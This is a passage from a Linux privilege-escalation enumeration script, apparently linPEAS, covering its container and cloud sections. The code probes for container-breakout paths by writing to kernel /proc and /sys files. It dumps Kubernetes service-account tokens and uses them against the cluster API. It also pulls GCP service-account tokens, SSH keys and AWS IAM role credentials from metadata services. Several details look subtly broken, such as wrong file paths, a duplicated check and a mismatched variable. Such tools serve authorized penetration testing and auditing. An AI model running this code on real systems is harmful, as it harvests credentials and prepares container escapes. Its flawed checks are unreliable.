  if groups 2>/dev/null | grep -q '\bdocker\b'; then
    DOCKER_GROUP="Yes"
  fi
}

checkDockerRootless() {
  DOCKER_ROOTLESS="No"
  if docker info 2>/dev/null|grep -q rootless; then
    DOCKER_ROOTLESS="Yes ($TIP_DOCKER_ROOTLESS)"
  fi
}

enumerateDockerSockets() {
  dockerVersion="$(echo_not_found)"
  if ! [ "$SEARCHED_DOCKER_SOCKETS" ]; then
    SEARCHED_DOCKER_SOCKETS="1"
    for int_sock in $(find / ! -path "/sys/*" -type s -name "docker.sock" -o -name "docker.socket" -o -name "dockershim.sock" -o -name "containerd.sock" -o -name "crio.sock" -o -name "frakti.sock" -o -name "rktlet.sock" 2>/dev/null); do
      if ! [ "$IAMROOT" ] && [ -w "$int_sock" ]; then
        if echo "$int_sock" | grep -Eq "docker"; then
          dock_sock="$int_sock"
          echo "You have write permissions over Docker socket $dock_sock" | sed -${E} "s,$dock_sock,${SED_RED_YELLOW},g"
          echo "Docker enummeration:"
          docker_enumerated=""

          if [ "$(command -v curl)" ]; then
            sockInfoResponse="$(curl -s --unix-socket $dock_sock http://localhost/info)"
            dockerVersion=$(echo "$sockInfoResponse" | tr ',' '\n' | grep 'ServerVersion' | cut -d'"' -f 4)
            echo $sockInfoResponse | tr ',' '\n' | grep -E "$GREP_DOCKER_SOCK_INFOS" | grep -v "$GREP_DOCKER_SOCK_INFOS_IGNORE" | tr -d '"'
            if [ "$sockInfoResponse" ]; then docker_enumerated="1"; fi
          fi

          if [ "$(command -v docker)" ] && ! [ "$docker_enumerated" ]; then
            sockInfoResponse="$(docker info)"
            dockerVersion=$(echo "$sockInfoResponse" | tr ',' '\n' | grep 'Server Version' | cut -d' ' -f 4)
            printf "$sockInfoResponse" | tr ',' '\n' | grep -E "$GREP_DOCKER_SOCK_INFOS" | grep -v "$GREP_DOCKER_SOCK_INFOS_IGNORE" | tr -d '"'
          fi
        
        else
          echo "You have write permissions over interesting socket $int_sock" | sed -${E} "s,$int_sock,${SED_RED},g"
        fi

      else
        echo "You don't have write permissions over interesting socket $int_sock" | sed -${E} "s,$int_sock,${SED_GREEN},g"
      fi
    done
  fi
}

checkDockerVersionExploits() {
  if echo "$dockerVersion" | grep -iq "not found"; then
    VULN_CVE_2019_13139="$(echo_not_found)"
    VULN_CVE_2019_5736="$(echo_not_found)"
    return
  fi

  VULN_CVE_2019_13139="$(echo_no)"
  if [ "$(echo $dockerVersion | sed 's,\.,,g')" -lt "1895" ]; then
    VULN_CVE_2019_13139="Yes"
  fi

  VULN_CVE_2019_5736="$(echo_no)"
  if [ "$(echo $dockerVersion | sed 's,\.,,g')" -lt "1893" ]; then
    VULN_CVE_2019_5736="Yes"
  fi
}

checkContainerExploits() {
  VULN_CVE_2019_5021="$(echo_no)"
  if [ -f "/etc/alpine-release" ]; then
    alpineVersion=$(cat /etc/alpine-release)
    if [ "$(echo $alpineVersion | sed 's,\.,,g')" -ge "330" ] && [ "$(echo $alpineVersion | sed 's,\.,,g')" -le "360" ]; then
      VULN_CVE_2019_5021="Yes"
    fi
  fi
}

checkProcSysBreakouts(){
  if [ "$(ls -l /sys/fs/cgroup/*/release_agent 2>/dev/null)" ]; then release_agent_breakout1="Yes"; else release_agent_breakout1="No"; fi
  
  mkdir /tmp/cgroup_3628d4
  mount -t cgroup -o memory cgroup /tmp/cgroup_3628d4 2>/dev/null
  if [ $? -eq 0 ]; then release_agent_breakout2="Yes"; else release_agent_breakout2="No"; fi
  rm -rf /tmp/cgroup_3628d4 2>/dev/null
  
  core_pattern_breakout="$( (echo -n '' > /proc/sys/kernel/core_pattern && echo Yes) 2>/dev/null || echo No)"
  modprobe_present="$(ls -l `cat /proc/sys/kernel/modprobe` || echo No)"
  panic_on_oom_dos="$( (echo -n '' > /proc/sys/vm/panic_on_oom && echo Yes) 2>/dev/null || echo No)"
  panic_sys_fs_dos="$( (echo -n '' > /proc/sys/fs/suid_dumpable && echo Yes) 2>/dev/null || echo No)"
  binfmt_misc_breakout="$( (echo -n '' > /proc/sys/fs/binfmt_misc/register && echo Yes) 2>/dev/null || echo No)"
  proc_configgz_readable="$([ -r '/proc/config.gz' ] 2>/dev/null && echo Yes || echo No)"
  sysreq_trigger_dos="$( (echo -n '' > /proc/sysrq-trigger && echo Yes) 2>/dev/null || echo No)"
  kmsg_readable="$( (dmesg > /dev/null 2>&1 && echo Yes) 2>/dev/null || echo No)"  
  kallsyms_readable="$( (head -n 1 /proc/kallsyms > /dev/null && echo Yes )2>/dev/null || echo No))"
  mem_readable="$( (head -n 1 /proc/self/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  if [ "$(head -n 1 /tmp/kcore 2>/dev/null)" ]; then kcore_readable="Yes"; else kcore_readable="No"; fi
  kmem_readable="$( (head -n 1 /proc/kmem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  kmem_writable="$( (echo -n '' > /proc/kmem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  mem_readable="$( (head -n 1 /proc/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  mem_writable="$( (echo -n '' > /proc/mem > /dev/null && echo Yes) 2>/dev/null || echo No)"
  sched_debug_readable="$( (head -n 1 /proc/sched_debug > /dev/null && echo Yes) 2>/dev/null || echo No)"
  mountinfo_readable="$( (head -n 1 /proc/*/mountinfo > /dev/null && echo Yes) 2>/dev/null || echo No)"
  uevent_helper_breakout="$( (echo -n '' > /sys/kernel/uevent_helper && echo Yes) 2>/dev/null || echo No)"
  vmcoreinfo_readable="$( (head -n 1 /sys/kernel/vmcoreinfo > /dev/null && echo Yes) 2>/dev/null || echo No)"
  security_present="$( (ls -l /sys/kernel/security > /dev/null && echo Yes) 2>/dev/null || echo No)"
  security_writable="$( (echo -n '' > /sys/kernel/security/a && echo Yes) 2>/dev/null || echo No)"
  efi_vars_writable="$( (echo -n '' > /sys/firmware/efi/vars && echo Yes) 2>/dev/null || echo No)"
  efi_efivars_writable="$( (echo -n '' > /sys/firmware/efi/efivars && echo Yes) 2>/dev/null || echo No)"
}


containerCheck

print_2title "Container related tools present"
command -v docker 
command -v lxc 
command -v rkt 
command -v kubectl
command -v podman
command -v runc

print_2title "Am I Containered?"
execBin "AmIContainered" "https://github.com/genuinetools/amicontained" "$FAT_LINPEAS_AMICONTAINED"

print_2title "Container details"
print_list "Is this a container? ...........$NC $containerType"

print_list "Any running containers? ........ "$NC
dockercontainers=$(docker ps --format "{{.Names}}" 2>/dev/null | wc -l)
podmancontainers=$(podman ps --format "{{.Names}}" 2>/dev/null | wc -l)
lxccontainers=$(lxc list -c n --format csv 2>/dev/null | wc -l)
rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)
if [ "$dockercontainers" -eq "0" ] && [ "$lxccontainers" -eq "0" ] && [ "$rktcontainers" -eq "0" ] && [ "$podmancontainers" -eq "0" ]; then
    echo_no
else
    containerCounts=""
    if [ "$dockercontainers" -ne "0" ]; then containerCounts="${containerCounts}docker($dockercontainers) "; fi
    if [ "$podmancontainers" -ne "0" ]; then containerCounts="${containerCounts}podman($podmancontainers) "; fi
    if [ "$lxccontainers" -ne "0" ]; then containerCounts="${containerCounts}lxc($lxccontainers) "; fi
    if [ "$rktcontainers" -ne "0" ]; then containerCounts="${containerCounts}rkt($rktcontainers) "; fi
    echo "Yes $containerCounts" | sed -${E} "s,.*,${SED_RED},"
    

    if [ "$dockercontainers" -ne "0" ]; then echo "Running Docker Containers" | sed -${E} "s,.*,${SED_RED},"; docker ps | tail -n +2 2>/dev/null; echo ""; fi
    if [ "$podmancontainers" -ne "0" ]; then echo "Running Podman Containers" | sed -${E} "s,.*,${SED_RED},"; podman ps | tail -n +2 2>/dev/null; echo ""; fi
    if [ "$lxccontainers" -ne "0" ]; then echo "Running LXC Containers" | sed -${E} "s,.*,${SED_RED},"; lxc list 2>/dev/null; echo ""; fi
    if [ "$rktcontainers" -ne "0" ]; then echo "Running RKT Containers" | sed -${E} "s,.*,${SED_RED},"; rkt list 2>/dev/null; echo ""; fi
fi


if echo "$containerType" | grep -qi "docker"; then
    print_2title "Docker Container details"
    inDockerGroup
    print_list "Am I inside Docker group .......$NC $DOCKER_GROUP\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "Looking and enumerating Docker Sockets\n"$NC
    enumerateDockerSockets
    print_list "Docker version .................$NC$dockerVersion"
    checkDockerVersionExploits
    print_list "Vulnerable to CVE-2019-5736 ....$NC$VULN_CVE_2019_5736"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "Vulnerable to CVE-2019-13139 ...$NC$VULN_CVE_2019_13139"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    if [ "$inContainer" ]; then
        checkDockerRootless
        print_list "Rootless Docker? ................ $DOCKER_ROOTLESS\n"$NC | sed -${E} "s,No,${SED_RED}," | sed -${E} "s,Yes,${SED_GREEN},"
        echo ""
    fi
    if df -h | grep docker; then
        print_2title "Docker Overlays"
        df -h | grep docker
    fi
fi

if [ "$(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p')" ]; then
  print_2title "Listing mounted tokens"
  print_info "kub3rs"
  ALREADY="IinItialVaaluE"
  for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
      TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
      if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
          ALREADY="$ALREADY|$TOKEN"
          echo "Directory: $i"
          echo "Namespace: $(cat $i)"
          echo ""
          echo $TOKEN
          echo "================================================================================"
          echo ""
      fi
  done
fi

if [ "$inContainer" ]; then
    echo ""
    print_2title "Container & breakout enumeration"
    print_info "break it out"
    print_list "Container ID ...................$NC $(cat /etc/hostname && echo '')"
    if echo "$containerType" | grep -qi "docker"; then
        print_list "Container Full ID ..............$NC $(basename $(cat /proc/1/cpuset))\n"
    fi
    print_list "Seccomp enabled? ............... "$NC
    ([ "$(grep Seccomp /proc/self/status | grep -v 0)" ] && echo "enabled" || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,enabled,${SED_GREEN},"

    print_list "AppArmor profile? .............. "$NC
    (cat /proc/self/attr/current 2>/dev/null || echo "disabled") | sed "s,disabled,${SED_RED}," | sed "s,kernel,${SED_GREEN},"

    print_list "User proc namespace? ........... "$NC
    if [ "$(cat /proc/self/uid_map 2>/dev/null)" ]; then echo "enabled" | sed "s,enabled,${SED_GREEN},"; else echo "disabled" | sed "s,disabled,${SED_RED},"; fi

    checkContainerExploits
    print_list "Vulnerable to CVE-2019-5021 .... $VULN_CVE_2019_5021\n"$NC | sed -${E} "s,Yes,${SED_RED_YELLOW},"

    print_3title "Breakout via mounts"
    print_info "hexit via horse"
    
    checkProcSysBreakouts
    print_list "release_agent breakout 1........ $release_agent_breakout1\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "release_agent breakout 2........ $release_agent_breakout2\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "core_pattern breakout .......... $core_pattern_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "binfmt_misc breakout ........... $binfmt_misc_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "uevent_helper breakout ......... $uevent_helper_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "core_pattern breakout .......... $core_pattern_breakout\n" | sed -${E} "s,Yes,${SED_RED_YELLOW},"
    print_list "is modprobe present ............ $modprobe_present\n" | sed -${E} "s,/.*,${SED_RED},"
    print_list "DoS via panic_on_oom ........... $panic_on_oom_dos\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "DoS via panic_sys_fs ........... $panic_sys_fs_dos\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "DoS via sysreq_trigger_dos ..... $sysreq_trigger_dos\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "/proc/config.gz readable ....... $proc_configgz_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "/proc/sched_debug readable ..... $sched_debug_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "/proc/*/mountinfo readable ..... $mountinfo_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "/sys/kernel/security present ... $security_present\n" | sed -${E} "s,/Yes,${SED_RED},"
    print_list "/sys/kernel/security writable .. $security_writable\n" | sed -${E} "s,/Yes,${SED_RED},"
    if [ "$EXTRA_CHECKS" ]; then
      print_list "/proc/kmsg readable ............ $kmsg_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/kallsyms readable ........ $kallsyms_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/self/mem readable ........ $sched_debug_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/kcore readable ........... $kcore_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/kmem readable ............ $kmem_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/kmem writable ............ $kmem_writable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/mem readable ............. $mem_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/proc/mem writable ............. $mem_writable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/sys/kernel/vmcoreinfo readable  $vmcoreinfo_readable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/sys/firmware/efi/vars writable  $efi_vars_writable\n" | sed -${E} "s,/Yes,${SED_RED},"
      print_list "/sys/firmware/efi/efivars writable $efi_efivars_writable\n" | sed -${E} "s,/Yes,${SED_RED},"
    fi
    
    echo ""
    print_3title "Namespaces"
    print_info "no"
    ls -l /proc/self/ns/

    if echo "$containerType" | grep -qi "kubernetes"; then
        print_list "Kubernetes namespace ...........$NC $(cat /run/secrets/kubernetes.io/serviceaccount/namespace /var/run/secrets/kubernetes.io/serviceaccount/namespace /secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)\n"
        print_list "Kubernetes token ...............$NC $(cat /run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/token /secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\n"
        echo ""
        
        print_2title "Kubernetes Information"
        print_info "nolinksbad"
        
        
        print_3title "Kubernetes service account folder"
        ls -lR /run/secrets/kubernetes.io/ /var/run/secrets/kubernetes.io/ /secrets/kubernetes.io/ 2>/dev/null
        echo ""
        
        print_3title "Kubernetes env vars"
        (env | set) | grep -Ei "kubernetes|kube" | grep -Ev "^WF=|^Wfolders=|^mounted=|^USEFUL_SOFTWARE='|^INT_HIDDEN_FILES=|^containerType="
        echo ""

        print_3title "Current sa user k8s permissions"
        print_info "omgstop"
        kubectl auth can-i --list 2>/dev/null || curl -s -k -d "$(echo \"eyJraW5kIjoiU2VsZlN1YmplY3RSdWxlc1JldmlldyIsImFwaVZlcnNpb24iOiJhdXRob3JpemF0aW9uLms4cy5pby92MSIsIm1ldGFkYXRhIjp7ImNyZWF0aW9uVGltZXN0YW1wIjpudWxsfSwic3BlYyI6eyJuYW1lc3BhY2UiOiJlZXZlZSJ9LCJzdGF0dXMiOnsicmVzb3VyY2VSdWxlcyI6bnVsbCwibm9uUmVzb3VyY2VSdWxlcyI6bnVsbCwiaW5jb21wbGV0ZSI6ZmFsc2V9fQo=\"|base64 -d)" \
          "https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
            -X 'POST' -H 'Content-Type: application/json' \
            --header "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" | sed "s,secrets|exec|create|patch|impersonate|\"*\",${SED_RED},"

    fi
    echo ""

    print_2title "Container Capabilities"
    print_info "eskappi c0nTa1nors"
    if [ "$(command -v capsh)" ]; then 
      capsh --print 2>/dev/null | sed -${E} "s,$containercapsB,${SED_RED},g"
    else
      cat /proc/self/status | grep Cap | sed -${E} "s, .*,${SED_RED},g" | sed -${E} "s,0000000000000000|00000000a80425fb,${SED_GREEN},g"
    fi
    echo ""

    print_2title "Privilege Mode"
    if [ -x "$(command -v fdisk)" ]; then
        if [ "$(fdisk -l 2>/dev/null | wc -l)" -gt 0 ]; then
            echo "Privilege Mode is enabled"| sed -${E} "s,enabled,${SED_RED_YELLOW},"
        else
            echo "Privilege Mode is disabled"| sed -${E} "s,disabled,${SED_GREEN},"
        fi
    else
        echo_not_found
    fi
    echo ""

    print_2title "Interesting Files Mounted"
    (mount -l || cat /proc/self/mountinfo || cat /proc/1/mountinfo || cat /proc/mounts || cat /proc/self/mounts || cat /proc/1/mounts )2>/dev/null | grep -Ev "$GREP_IGNORE_MOUNTS" | sed -${E} "s,.sock,${SED_RED}," | sed -${E} "s,docker.sock,${SED_RED_YELLOW}," | sed -${E} "s,/dev/,${SED_RED},g"
    echo ""

    print_2title "Possible Entrypoints"
    ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null | sort | uniq
    echo ""
fi

fi
echo ''
echo ''
if [ "$WAIT" ]; then echo "Press enter to continue"; read "asd"; fi

if echo $CHECKS | grep -q cloud; then
print_title "Cloud"

GCP_GOOD_SCOPES="/devstorage.read_only|/logging.write|/monitoring|/servicecontrol|/service.management.readonly|/trace.append"
GCP_BAD_SCOPES="/cloud-platform|/compute"

exec_with_jq(){
  if [ "$(command -v jq)" ]; then 
    $@ | jq;
   else 
    $@;
   fi
}

check_gcp(){
  is_gcp="No"
  if grep -q metadata.google.internal /etc/hosts 2>/dev/null || (curl --connect-timeout 2 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]) || (wget --timeout 2 --tries 1 metadata.google.internal >/dev/null 2>&1 && [ "$?" -eq "0" ]); then
    is_gcp="Yes"
  fi
}

check_aws_ecs(){
  is_aws_ecs="No"
  if (env | grep -q ECS_CONTAINER_METADATA_URI_v4); then
    is_aws_ecs="Yes";
    aws_ecs_metadata_uri=$ECS_CONTAINER_METADATA_URI_v4;
    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  
  elif (env | grep -q ECS_CONTAINER_METADATA_URI); then
    is_aws_ecs="Yes";
    aws_ecs_metadata_uri=$ECS_CONTAINER_METADATA_URI;
    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  
  elif (env | grep -q AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); then
    is_aws_ecs="Yes";
    
  
  elif (curl --connect-timeout 2 "http://169.254.170.2/v2/credentials/" >/dev/null 2>&1 && [ "$?" -eq "0" ]) || (wget --timeout 2 --tries 1 "http://169.254.170.2/v2/credentials/" >/dev/null 2>&1 && [ "$?" -eq "0" ]); then
    is_aws_ecs="Yes";

  fi
  
  if [ "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
    aws_ecs_service_account_uri="http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
  fi
}

check_aws_ec2(){
  is_aws_ec2="No"

  if [ -d "/var/log/amazon/" ]; then
    is_aws_ec2="Yes"
    EC2_TOKEN=$(curl --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget --timeout 2 --tries 1 -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)

  else
    EC2_TOKEN=$(curl --connect-timeout 2 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget --timeout 2 --tries 1 -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
    if [ "$(echo $EC2_TOKEN | cut -c1-2)" = "AQ" ]; then
      is_aws_ec2="Yes"
    fi
  fi
}

check_aws_lambda(){
  is_aws_lambda="No"

  if (env | grep -q AWS_LAMBDA_); then
    is_aws_lambda="Yes"
  fi
}


check_gcp
print_list "Google Cloud Platform? ............... $is_gcp\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_ecs
print_list "AWS ECS? ............................. $is_aws_ecs\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_ec2
print_list "AWS EC2? ............................. $is_aws_ec2\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"
check_aws_lambda
print_list "AWS Lambda? .......................... $is_aws_lambda\n"$NC | sed "s,Yes,${SED_RED}," | sed "s,No,${SED_GREEN},"

echo ""

if [ "$is_gcp" = "Yes" ]; then
    gcp_req=""
    if [ "$(command -v curl)" ]; then
        gcp_req='curl -s -f  -H "X-Google-Metadata-Request: True"'
    elif [ "$(command -v wget)" ]; then
        gcp_req='wget -q -O - --header "X-Google-Metadata-Request: True"'
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi


    if [ "$gcp_req" ]; then
        print_2title "Google CLoud Platform Enumeration"
        print_info "gcp-sec"


        p_id=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/project-id')
        [ "$p_id" ] && echo "Project-ID: $p_id"
        p_num=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id')
        [ "$p_num" ] && echo "Project Number: $p_num"
        pssh_k=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys')
        [ "$pssh_k" ] && echo "Project SSH-Keys: $pssh_k"
        p_attrs=$(eval $gcp_req 'http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true')
        [ "$p_attrs" ] && echo "All Project Attributes: $p_attrs"


        osl_u=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/users)
        [ "$osl_u" ] && echo "OSLogin users: $osl_u"
        osl_g=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/groups)
        [ "$osl_g" ] && echo "OSLogin Groups: $osl_g"
        osl_sk=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/security-keys)
        [ "$osl_sk" ] && echo "OSLogin Security Keys: $osl_sk"
        osl_au=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/oslogin/authorize)
        [ "$osl_au" ] && echo "OSLogin Authorize: $osl_au"


        inst_d=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/description)
        [ "$inst_d" ] && echo "Instance Description: "
        inst_hostn=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/hostname)
        [ "$inst_hostn" ] && echo "Hostname: $inst_hostn"
        inst_id=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/id)
        [ "$inst_id" ] && echo "Instance ID: $inst_id"
        inst_img=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/image)
        [ "$inst_img" ] && echo "Instance Image: $inst_img"
        inst_mt=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/machine-type)
        [ "$inst_mt" ] && echo "Machine Type: $inst_mt"
        inst_n=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/name)
        [ "$inst_n" ] && echo "Instance Name: $inst_n"
        inst_tag=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/scheduling/tags)
        [ "$inst_tag" ] && echo "Instance tags: $inst_tag"
        inst_zone=$(eval $gcp_req http://metadata.google.internal/computeMetadata/v1/instance/zone)
        [ "$inst_zone" ] && echo "Zone: $inst_zone"

        inst_k8s_loc=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location")
        [ "$inst_k8s_loc" ] && echo "K8s Cluster Location: $inst_k8s_loc"
        inst_k8s_name=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-name")
        [ "$inst_k8s_name" ] && echo "K8s Cluster name: $inst_k8s_name"
        inst_k8s_osl_e=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/enable-oslogin")
        [ "$inst_k8s_osl_e" ] && echo "K8s OSLoging enabled: $inst_k8s_osl_e"
        inst_k8s_klab=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-labels")
        [ "$inst_k8s_klab" ] && echo "K8s Kube-labels: $inst_k8s_klab"
        inst_k8s_kubec=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kubeconfig")
        [ "$inst_k8s_kubec" ] && echo "K8s Kubeconfig: $inst_k8s_kubec"
        inst_k8s_kubenv=$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env")
        [ "$inst_k8s_kubenv" ] && echo "K8s Kube-env: $inst_k8s_kubenv"

        echo ""
        print_3title "Interfaces"
        for iface in $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/"); do 
            echo "  IP: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/ip")
            echo "  Subnetmask: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
            echo "  Gateway: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
            echo "  DNS: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
            echo "  Network: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/$iface/network")
            echo "  ==============  "
        done

        echo ""
        print_3title "Service Accounts"
        for sa in $(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"); do 
            echo "  Name: $sa"
            echo "  Email: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/email")
            echo "  Aliases: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/aliases")
            echo "  Identity: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/identity")
            echo "  Scopes: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/scopes") | sed -${E} "s,${GCP_GOOD_SCOPES},${SED_GREEN},g" | sed -${E} "s,${GCP_BAD_SCOPES},${SED_RED},g"
            echo "  Token: "$(eval $gcp_req "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/$sa/token")
            echo "  ==============  "
        done
    fi
fi


if [ "$is_aws_ecs" = "Yes" ]; then
    print_2title "AWS ECS Enumeration"
    
    aws_ecs_req=""
    if [ "$(command -v curl)" ]; then
        aws_ecs_req='curl -s -f'
    elif [ "$(command -v wget)" ]; then
        aws_ecs_req='wget -q -O -'
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi

    if [ "$aws_ecs_metadata_uri" ]; then
        print_3title "Container Info"
        exec_with_jq eval $aws_ecs_req "$aws_ecs_metadata_uri"
        echo ""
        
        print_3title "Task Info"
        exec_with_jq eval $aws_ecs_req "$aws_ecs_metadata_uri/task"
        echo ""
    else
        echo "I couldn't find ECS_CONTAINER_METADATA_URI env var to get container info"
    fi

    if [ "$aws_ecs_service_account_uri" ]; then
        print_3title "IAM Role"
        exec_with_jq eval $aws_ecs_req "$aws_ecs_service_account_uri"
        echo ""
    else
        echo "I couldn't find AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var to get IAM role info (the task is running without a task role probably)"
    fi
fi

if [ "$is_aws_ec2" = "Yes" ]; then
    print_2title "AWS EC2 Enumeration"
    
    HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
    URL="http://169.254.169.254/latest/meta-data"
    
    aws_req=""
    if [ "$(command -v curl)" ]; then
        aws_req="curl -s -f -H '$HEADER'"
    elif [ "$(command -v wget)" ]; then
        aws_req="wget -q -O - -H '$HEADER'"
    else 
        echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
    fi
  
    if [ "$aws_req" ]; then
        printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
        printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
        printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
        printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
        printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
        printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

        echo ""
        print_3title "Account Info"
        exec_with_jq eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""

        echo ""
        print_3title "Network Info"
        for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do 
          echo "Mac: $mac"
          printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
          printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
          printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
          echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
          printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
          echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
          printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
          echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
